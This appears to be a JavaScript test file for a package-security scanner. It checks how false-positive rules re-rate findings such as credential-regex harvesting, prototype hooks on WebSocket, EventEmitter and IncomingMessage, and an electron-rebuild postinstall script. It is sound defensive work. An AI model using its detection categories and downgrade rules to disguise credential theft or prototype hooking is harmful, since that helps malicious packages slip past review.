  test('FP-B3-5: credential_regex_harvest count ≤ 2 → stays HIGH', () => {
    const threats = [
      { type: 'credential_regex_harvest', severity: 'HIGH', file: 'a.js', message: 'Regex 1' },
      { type: 'credential_regex_harvest', severity: 'HIGH', file: 'b.js', message: 'Regex 2' }
    ];
    applyFPReductions(threats);
    const highCount = threats.filter(t => t.type === 'credential_regex_harvest' && t.severity === 'HIGH').length;
    assert(highCount === 2, `2 credential_regex_harvest should stay HIGH (count ≤ maxCount), got ${highCount}`);
  });

  test('FP-B3-6: FRAMEWORK_PROTOTYPES includes WebSocket → downgrade to MEDIUM', () => {
    const threats = [
      { type: 'prototype_hook', severity: 'HIGH', file: 'a.js', message: 'WebSocket.prototype.send overridden' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'MEDIUM',
      `WebSocket.prototype hook should be MEDIUM, got ${threats[0].severity}`);
  });

  test('FP-B3-6: FRAMEWORK_PROTOTYPES includes EventEmitter → downgrade to MEDIUM', () => {
    const threats = [
      { type: 'prototype_hook', severity: 'HIGH', file: 'a.js', message: 'EventEmitter.prototype.emit overridden' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'MEDIUM',
      `EventEmitter.prototype hook should be MEDIUM, got ${threats[0].severity}`);
  });

  test('FP-B3-6: Non-framework prototype stays HIGH (IncomingMessage)', () => {
    const threats = [
      { type: 'prototype_hook', severity: 'HIGH', file: 'a.js', message: 'IncomingMessage.prototype.read overridden' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'HIGH',
      `IncomingMessage.prototype hook should stay HIGH, got ${threats[0].severity}`);
  });

  test('FP-B3-3: lifecycle_script with electron-rebuild → LOW', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json',
        message: 'Script "postinstall" detected: electron-rebuild' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'LOW',
      `electron-rebuild lifecycle should be LOW, got ${threats[0].severity}`);
  });
}

module.exports = { runCompoundScoringTests };
